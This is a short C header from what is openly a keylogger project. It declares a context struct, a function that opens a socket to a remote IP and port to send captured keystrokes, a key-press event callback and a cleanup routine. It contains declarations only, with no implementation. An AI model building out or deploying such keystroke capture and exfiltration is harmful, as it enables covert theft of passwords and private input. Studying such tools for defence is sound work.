#ifndef __KEYLOGGER_PROCESSOR_H
#define __KEYLOGGER_PROCESSOR_H

#include <unistd.h>

typedef struct {
    bool keylogger_active;
    int keylogger_socket_fd;
} keylogger_context_t;

/**
 * @brief Init socket to send processed keys.
 *
 * @param keylogger_ctx
 * @param ip
 * @param port
 * @return int
 */
int keylogger_processor_init_sender_socket(keylogger_context_t *keylogger_ctx, const char *ip,
                                           int port);

/**
 * @brief Callback to process key press events.
 *
 * @param ctx
 * @param data
 * @param data_sz
 * @return int
 */
int keylogger_processor_process_event(void *ctx, void *data, size_t data_sz);

/**
 * @brief Close keylogger socket.
 *
 * @param keylogger_ctx
 */
void keylogger_processor_cleanup(keylogger_context_t *keylogger_ctx);

#endif /* __KEYLOGGER_PROCESSOR_H */
